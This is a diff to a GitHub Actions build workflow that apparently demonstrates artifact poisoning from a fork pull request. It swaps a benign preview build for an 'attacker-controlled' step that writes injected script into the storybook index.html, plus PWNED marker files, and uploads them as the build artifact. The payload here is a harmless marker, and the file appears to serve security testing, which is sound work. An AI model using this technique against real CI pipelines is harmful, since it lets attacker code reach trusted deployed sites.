@@ -1,8 +1,6 @@
 name: Build
 on:
   pull_request:
-  push:
-    branches: [main]
 
 permissions:
   contents: read
@@ -11,11 +9,12 @@ jobs:
   build:
     runs-on: ubuntu-latest
     steps:
-      - name: Produce benign artifact
+      - name: Attacker-controlled workflow (this file is part of the fork PR diff)
         run: |
           mkdir -p storybook-static tokens/css
-          printf '<html><body>BENIGN PREVIEW FROM TRUSTED BRANCH</body></html>\n' > storybook-static/index.html
-          echo "- benign" > tokens/css/file-sizes.diff
+          printf '<html><body><h1>PWNED-BY-FORK-PR</h1><script>document.title="attacker js on preview origin"</script></body></html>\n' > storybook-static/index.html
+          echo "ATTACKER_MARKER_LEO_DEPLOY" > storybook-static/PWNED.txt
+          echo "- attacker injected diff" > tokens/css/file-sizes.diff
       - uses: actions/upload-artifact@v4
         with:
           name: build
